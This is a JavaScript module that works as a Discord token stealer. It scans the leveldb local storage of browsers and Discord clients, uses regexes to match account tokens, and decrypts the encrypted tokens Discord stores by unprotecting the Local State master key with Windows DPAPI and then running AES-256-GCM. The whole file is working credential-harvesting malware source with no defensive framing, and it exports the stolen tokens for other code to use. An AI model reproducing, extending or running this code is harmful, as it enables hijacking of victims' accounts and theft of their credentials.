const fs = require("fs");
const crypto = require("crypto");
const path = require("path");
const aura = require("win-dpapi");

let ALL_TOKENS = [];

const cords = [
    "discord",
    "discordcanary",
    "discordptb",
    "discorddevelopment",
    "lightcord",
];

async function FIND_TOKENS(p) {
    const tail = p;
    p = path.join(p, "Local Storage/leveldb");

    if (!cords.some((d) => tail.includes(d))) {
        try {
            const files = await fs.promises.readdir(p);
            
            for (const file of files) {
                const FILE_P = path.join(p, file);
                const FILE_C = await fs.promises.readFile(FILE_P, "utf8");

                const regexs = [
                    /mfa\.[\w-]{84}/g,
                    /[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm,
                    /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g,
                ];

                regexs.forEach((r) => {
                    const FOUND_TOKENS = FILE_C.match(r);
                    if (FOUND_TOKENS) {
                        FOUND_TOKENS.forEach((tkn) => {
                            if (!ALL_TOKENS.includes(tkn)) ALL_TOKENS.push(tkn);
                        });
                    }
                });
            }
        } catch (e) { }
        return ALL_TOKENS;
    } else {
        const LOCAL_STATE_PATH = path.join(tail, "Local State");
        if (fs.existsSync(LOCAL_STATE_PATH)) {
            try {
                fs.readdirSync(p).forEach((f) => {
                    if (f.endsWith(".log") || f.endsWith(".ldb")) {
                        fs.readFileSync(path.join(p, f), "utf8").split(/\r?\n/).forEach((l) => {
                            const FOUND_TOKENS = l.match(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);

                            if (FOUND_TOKENS) {
                                FOUND_TOKENS.forEach((tkn) => {
                                    
                                    const enc = Buffer.from(JSON.parse(fs.readFileSync(LOCAL_STATE_PATH)).os_crypt.encrypted_key,"base64").slice(5);
                                    const key = aura.unprotectData(Buffer.from(enc, "utf-8"), null, "CurrentUser");
                                    const tkns = Buffer.from(tkn.split("dQw4w9WgXcQ:")[1], "base64");

                                    const run = tkns.slice(3, 15);
                                    const mid = tkns.slice(15, tkns.length - 16);

                                    const decyph = crypto.createDecipheriv("aes-256-gcm", key, run);

                                    decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));

                                    const out = decyph.update(mid, "base64", "utf-8") + decyph.final("utf-8");

                                    if (!ALL_TOKENS.includes(out)) {
                                        ALL_TOKENS.push(out);
                                    }
                                });
                            }
                        });
                    }
                });
            } catch (e) { }
            return ALL_TOKENS;
        }
    }
}

module.exports = {
    FIND_TOKENS,
    ALL_TOKENS,
};